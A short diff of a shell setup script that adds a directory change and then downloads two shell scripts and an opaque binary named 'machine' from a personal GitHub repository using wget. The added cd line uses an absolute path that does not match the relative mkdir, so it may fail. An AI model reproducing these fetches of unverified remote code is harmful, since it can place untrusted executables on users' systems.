@@ -1,4 +1,5 @@
 sudo mkdir firstproject
+cd /firstproject/
 wget https://raw.githubusercontent.com/Akira-Slasvi/machine-learn/main/nvidia.sh
 wget https://raw.githubusercontent.com/Akira-Slasvi/machine-learn/main/project.sh
 wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinellearn/machine
